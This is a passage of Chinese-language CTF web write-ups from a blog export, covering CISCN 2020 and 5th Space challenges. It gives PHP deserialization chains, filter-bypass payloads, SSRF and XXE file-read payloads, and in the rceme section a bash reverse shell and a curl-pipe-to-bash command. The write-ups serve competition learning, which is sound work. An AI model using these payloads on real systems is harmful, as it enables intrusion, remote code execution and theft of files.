class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>




<p><a href="https://www.gem-love.com/ctf/2569.html#babyunserialize" target="_blank" rel="noopener">y1ng师傅</a>是全局搜索<code>__destruct()</code>，在jig.php发现了任意写，于是直接gethell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        <span class="comment">//! Storage location</span></span><br><span class="line">        $dir = <span class="string">'/var/www/html/'</span>,</span><br><span class="line">        <span class="comment">//! Current storage format</span></span><br><span class="line">        $format = <span class="keyword">self</span>::FORMAT_JSON,</span><br><span class="line">        <span class="comment">//! Jig log</span></span><br><span class="line">        $data = <span class="keyword">array</span>(<span class="string">"info.php"</span>=&gt;<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"&lt;?php phpinfo();?&gt;"</span>)),</span><br><span class="line">        <span class="comment">//! lazy load/save files</span></span><br><span class="line">        $lazy = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$jig = <span class="keyword">new</span> Jig();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($jig));</span><br></pre></td></tr></table></figure>

<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>php多进程，主进程会等待子进程运行结束，子进程异常退出会触发<code>phpinfo()</code>。<br>直接拿php函数列表fuzz。</p>
<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/easyphp.jpg" alt="easyphp"></p>
<p>以上函数均可导致子进程异常退出，随便找一个即可。</p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">a</span>=fsockopen&amp;b=123</span><br></pre></td></tr></table></figure>

<p>本来想自己fuzz一下的，但环境没了。</p>
<h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>要求两个变量长度不能超过5，但md5的值又要相同，而且强弱比较也不能相同</p>
<p>考脑洞</p>
<p>利用php预定义常量绕过</p>
<p>比如 M_PI,M_E ,INF,M_LN2</p>
<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821142717774.png" alt="image-20200821142717774"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $trick1=INF;</span><br><span class="line"><span class="keyword">public</span> $trick2=INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> trick()) );</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">trick=O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>trick%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>trick1%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>t</span><br><span class="line">rick2%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>在<code>/DeveloperControlPanel</code>路由中发现</p>
<p>if(Admin[key] === password) 才能得到flag</p>
<p>在 <code>/Privilege</code>下，利用setFn设置值</p>
<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821144143013.png" alt="image-20200821144143013"></p>
<p>然后找了下set-value的漏洞，发现一个原型链污染</p>
<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821143721692.png" alt="image-20200821143721692"></p>
<p>而3.0.0 正好收到影响</p>
<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200820173333614.png" alt="image-20200820173333614"></p>
<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200820173350849.png" alt="image-20200820173350849"></p>
<h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><h3 id="rceme-1"><a href="#rceme-1" class="headerlink" title="rceme"></a>rceme</h3><p>zzzphp的一个命令执行的漏洞，但<code>danger_key()</code> 增加了一个<code>htmlspecialchars()</code>函数导致原本的payload失效</p>
<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821144836357.png" alt="image-20200821144836357"></p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 正则过滤绕过：</span><br><span class="line">  很容易看懂，格式为&#123;<span class="variable"><span class="keyword">if</span></span>:<span class="variable">payload</span>&#125;&#123;<span class="variable">end</span> <span class="variable"><span class="keyword">if</span></span>&#125;，可利用的地方在<span class="variable">payload</span>处。</span><br><span class="line"><span class="number">2</span>. 字符串过滤绕过：</span><br><span class="line">  <span class="function"><span class="title">hex2bin</span>(<span class="title">dechex</span>(<span class="variable">xxx</span>)).hex2bin(<span class="title">dechex</span>(<span class="variable">xxx</span>))</span></span><br><span class="line"><span class="number">3</span>. 拼接字符串执行命令</span><br><span class="line">  简单来说就是闭合<span class="variable"><span class="keyword">if</span></span>语句。</span><br></pre></td></tr></table></figure>

<p>根据之前的题目，直接构造phpinfo</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">a=&#123;<span class="keyword">if</span>:<span class="number">1</span>)(hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">104</span>)).hex2bin(dechex(<span class="number">112</span>)).hex2bin(dechex(<span class="number">105</span>)).hex2bin(dechex(<span class="number">110</span>)).hex2bin(dechex(<span class="number">102</span>)).hex2bin(dechex(<span class="number">111</span>)))();die();<span class="comment">//&#125;&#123;end%20if&#125;</span></span><br></pre></td></tr></table></figure>

<p>也有师傅用反引号绕过</p>
<p>起一个http服务器，写入反弹shell命令。</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">bash -c 'bash -i &gt;/dev/tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span>'</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/<span class="string">?a</span>=&#123;<span class="symbol">if:</span><span class="string">`curl ip:port/x |bash`</span>&#125;&#123;<span class="keyword">end</span>+<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200824154556091.png" alt="image-20200824154556091"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届第五空间安全大赛</title>
    <url>/2020/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-hate-php"><a href="#1-hate-php" class="headerlink" title="1.hate-php"></a>1.<strong>hate-php</strong></h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>禁用了 <code>=</code> 所以伪协议 拼接字符串 等方法用不了</p>
<p>但 取反和异或没被禁用</p>
<p>取反payload:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">code=(~<span class="symbol">%8</span>C<span class="symbol">%86</span><span class="symbol">%8</span>C<span class="symbol">%8</span>B<span class="symbol">%9</span>A<span class="symbol">%92</span>)(~<span class="symbol">%9</span>C<span class="symbol">%9</span>E<span class="symbol">%8</span>B<span class="symbol">%DF</span><span class="symbol">%99</span><span class="symbol">%93</span><span class="symbol">%9</span>E<span class="symbol">%98</span><span class="symbol">%D1</span><span class="symbol">%8</span>F<span class="symbol">%97</span><span class="symbol">%8</span>F)</span><br></pre></td></tr></table></figure>

<p> 异或payload</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">code=(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%D3</span><span class="symbol">%D9</span><span class="symbol">%D3</span><span class="symbol">%D4</span><span class="symbol">%C5</span><span class="symbol">%CD</span>)(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%C3</span><span class="symbol">%C1</span><span class="symbol">%D4</span><span class="symbol">%80</span><span class="symbol">%C6</span><span class="symbol">%CC</span><span class="symbol">%C1</span><span class="symbol">%C7</span><span class="symbol">%8</span>E<span class="symbol">%D0</span><span class="symbol">%C8</span><span class="symbol">%D0</span>)</span><br></pre></td></tr></table></figure>

<p><a href="http://0xcreed.jxustctf.top/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/#RCE-me-I-don%E2%80%99t-think-U-can-system-RCE-prove-to-me">异或构造脚本</a></p>
<h3 id="2-do-you-know"><a href="#2-do-you-know" class="headerlink" title="2.do you know"></a>2.do you know</h3><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#本题无法访问外网</span></span><br><span class="line"><span class="comment">#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了</span></span><br><span class="line"><span class="comment">#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">'&amp;'</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'我什么都没有~'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"trick"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'be it so'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, 'post_data');</span></span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure>

<p>xxe.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#这题在上午的时候为了防止有人用webshell扫描器d，有一段时间临时过滤了system关键字，但是这个关键字在解题中是用不到的，所以才过滤它，给选手造成的不便请您谅解</span></span><br><span class="line"><span class="comment">#这题和命令执行无关，请勿尝试</span></span><br><span class="line"><span class="comment">#there is main.php and hints.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$data = preg_replace(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,$data);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($dom);</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">div.main&#123;</span><br><span class="line">    width:<span class="number">90</span>%;</span><br><span class="line">    max-width:<span class="number">50</span>%;</span><br><span class="line">    margin:<span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line">textarea&#123;</span><br><span class="line">    width:<span class="number">100</span>%;</span><br><span class="line">    height:<span class="number">100</span>%;</span><br><span class="line">&#125;</span><br><span class="line">input[type=<span class="string">"submit"</span>]&#123;</span><br><span class="line">    margin: <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class="main"&gt;</span><br><span class="line">    &lt;form action=<span class="string">""</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;textarea name=<span class="string">"data"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ($data!=<span class="keyword">false</span>)?htmlspecialchars($data):htmlspecialchars(<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;/textarea&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input style=<span class="string">""</span> type=<span class="string">"submit"</span> value=<span class="string">"submit"</span>/&gt;</span><br><span class="line">        &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a target=<span class="string">"_blank"</span> href=<span class="string">"&lt;?php echo basename(__FILE__).'?s';?&gt;"</span>&gt;View Source Code&lt;/a&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> htmlspecialchars($resp);<span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>main.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $object;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $variable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $o = <span class="keyword">$this</span>-&gt;object;</span><br><span class="line">        $m = <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">        $v = <span class="keyword">$this</span>-&gt;variable;</span><br><span class="line">        $o-&gt;$m();</span><br><span class="line">        <span class="keyword">global</span> $$v;</span><br><span class="line">        $answer = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $answer;</span><br><span class="line">        <span class="keyword">echo</span> $answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'‬'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'‬'</span>])-&gt;CaptureTheFlag();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you do not pass the misc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hints.php</p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">#there is an main.php</span></span><br><span class="line"><span class="meta">#“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”</span></span><br><span class="line"><span class="meta">#“那你给我算一个出来”</span></span><br><span class="line"><span class="meta">#“好的”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#小白打开了win10的calc，开始计算8129947191207+1992100742919</span></span><br><span class="line"><span class="meta">#然后他直接用鼠标复制了结果，计算md5值</span></span><br><span class="line"><span class="meta">#“好了大佬，10122047934126的md5值”</span></span><br><span class="line"><span class="meta">#“6dc6a29df1d7d33166bba5e17e42d2ea对吧”</span></span><br><span class="line"><span class="meta">#“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#“咱们对一下数字？”</span></span><br><span class="line"><span class="meta">#‭10122047934126‬</span></span><br><span class="line"><span class="meta">#10122047934126</span></span><br><span class="line"><span class="meta">#“这不是一样的吗....咋就md5不一样了.......”</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#找出来到底哪里出了问题，就可以看这道web题目了</span></span><br></pre></td></tr></table></figure>

<p>根据这里hints.php的内容提示，win10的计算器鼠标直接复制后，会在数字的前后加上两个不可见的unicode字符%e2%80%ad和%e2%80%ac，在这里的<code>unserialize($_GET[&#39;‬&#39;])</code>部分，测试后发现可以用<code>%e2%80%ac=123</code>传参内容。<br>到这一步按照预期应该是利用两个类的反序列化操作去想办法读取flag.txt内容了，但是其实回过头看看，xxe.php已经能够任意文件读取了不是吗？</p>
<ol>
<li><p>url编码绕过</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>];  <span class="comment">#不会对url解码，所以直接绕过过滤</span></span><br></pre></td></tr></table></figure>

<p> payload</p>
<p> <code>a=%66%69%6c%65:///var/www/html/%66%6c%61%67.php&amp;b=%66%69%6c%65:///var/www/html/%6 6%6c%61%67.php</code></p>
<p> <img src="/2020/06/第四届第五空间安全大赛/image-20200626110638762.png" alt="image-20200626110638762"></p>
</li>
<li><p>gopher</p>
<p> SSRF 利用 gopher 模拟 POST 请求，访问 xxe.php，然后利用 xxe 来读文件</p>
<p> index.php 用的过滤函数是 preg_match</p>
<p> 而在 xxe.php 里用的是 replace</p>
 <figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">preg_replace</span><span class="params">(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,<span class="variable">$data</span>)</span></span></span><br></pre></td></tr></table></figure>

<p> 那么可以直接用 双写的方式来 bypass, 类似这样：</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">flreadag</span>   ==&gt; preg_replace(<span class="string">"/flag/i"</span>, <span class="string">''</span>, <span class="variable">$data</span>) ==&gt; flag</span><br></pre></td></tr></table></figure>

<p> 接着xxe读取文件</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ureadtf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/rereadad=convert.base64-encode/resource=flreadag.php"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>先URL编码下，谁便POST一下获取<code>Content-Length</code></p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200626120356953.png" alt="image-20200626120356953"></p>
<p>然后将data再URL编码两次(用PHP函数)</p>
<p><img src="/2020/06/第四届第五空间安全大赛/image-20200626120455719.png" alt="image-20200626120455719"></p>
<p>payload</p>
